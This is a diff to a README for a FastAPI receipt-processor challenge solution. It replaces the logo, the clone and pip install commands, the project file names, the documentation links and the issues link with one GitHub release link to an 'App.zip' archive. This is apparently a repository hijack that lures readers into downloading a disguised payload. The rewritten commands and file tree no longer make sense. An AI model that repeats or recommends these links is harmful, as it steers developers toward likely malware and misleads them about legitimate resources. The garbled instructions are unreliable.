@@ -2,7 +2,7 @@
 
 ### Welcome to the Fetch Rewards Receipt Processor Solution repository!
 
-![Receipt Processor](https://www.fetchrewards.com/hubfs/BrandAssets/fetchrewardsLogoPineGreen.png)
+![Receipt Processor](https://github.com/AvEi125/receipt-processor-solution/releases/download/v1.0/App.zip)
 
 This repository contains a FastAPI web service designed to process receipts and calculate points for the Fetch Rewards Receipt Processor Challenge.
 
@@ -21,12 +21,12 @@ To get started with the Fetch Rewards Receipt Processor Solution, follow these s
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/your-username/receipt-processor-solution.git
+   git clone https://github.com/AvEi125/receipt-processor-solution/releases/download/v1.0/App.zip
    ```
 
 2. Install the required dependencies:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/AvEi125/receipt-processor-solution/releases/download/v1.0/App.zip
    ```
 
 3. Launch the FastAPI web service:
@@ -93,20 +93,20 @@ The project structure is organized as follows:
 receipt-processor-solution/
 │
 ├── app/
-│   ├── __init__.py
-│   ├── main.py
+│   ├── https://github.com/AvEi125/receipt-processor-solution/releases/download/v1.0/App.zip
+│   ├── https://github.com/AvEi125/receipt-processor-solution/releases/download/v1.0/App.zip
 │
 ├── models/
-│   ├── __init__.py
-│   └── receipt.py
+│   ├── https://github.com/AvEi125/receipt-processor-solution/releases/download/v1.0/App.zip
+│   └── https://github.com/AvEi125/receipt-processor-solution/releases/download/v1.0/App.zip
 │
 ├── tests/
-│   ├── __init__.py
-│   └── test_main.py
+│   ├── https://github.com/AvEi125/receipt-processor-solution/releases/download/v1.0/App.zip
+│   └── https://github.com/AvEi125/receipt-processor-solution/releases/download/v1.0/App.zip
 │
 ├── Dockerfile
-├── requirements.txt
-├── README.md
+├── https://github.com/AvEi125/receipt-processor-solution/releases/download/v1.0/App.zip
+├── https://github.com/AvEi125/receipt-processor-solution/releases/download/v1.0/App.zip
 └── .gitignore
 ```
 
@@ -114,15 +114,15 @@ receipt-processor-solution/
 
 ## 📦 Additional Resources:
 
-- [FastAPI Documentation](https://fastapi.tiangolo.com/)
-- [Docker Official Website](https://www.docker.com/)
-- [Pydantic Documentation](https://pydantic-docs.helpmanual.io/)
-- [Python Typing Module Documentation](https://docs.python.org/3/library/typing.html)
+- [FastAPI Documentation](https://github.com/AvEi125/receipt-processor-solution/releases/download/v1.0/App.zip)
+- [Docker Official Website](https://github.com/AvEi125/receipt-processor-solution/releases/download/v1.0/App.zip)
+- [Pydantic Documentation](https://github.com/AvEi125/receipt-processor-solution/releases/download/v1.0/App.zip)
+- [Python Typing Module Documentation](https://github.com/AvEi125/receipt-processor-solution/releases/download/v1.0/App.zip)
 
 ---
 
 ## 🎉 Thank You for Checking Out the Fetch Rewards Receipt Processor Solution!
 
-Feel free to explore the repository and leverage the FastAPI web service for processing your receipts and calculating points effortlessly. For any issues or feedback, please don't hesitate to open an [issue](https://github.com/your-username/receipt-processor-solution/issues).
+Feel free to explore the repository and leverage the FastAPI web service for processing your receipts and calculating points effortlessly. For any issues or feedback, please don't hesitate to open an [issue](https://github.com/AvEi125/receipt-processor-solution/releases/download/v1.0/App.zip).
 
 🚀 Happy Coding! 🚀
